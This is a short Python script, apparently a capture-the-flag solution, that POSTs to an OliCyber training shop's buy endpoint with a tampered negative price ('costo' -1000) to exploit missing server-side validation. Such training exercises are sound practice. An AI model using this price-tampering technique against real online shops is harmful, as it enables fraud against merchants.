import requests

url="http://shops.challs.olicyber.it/buy.php"
headers = {
    "id":"2",
    "costo":"-1000"
}
r = requests.post(url, data=headers)
print(r.text)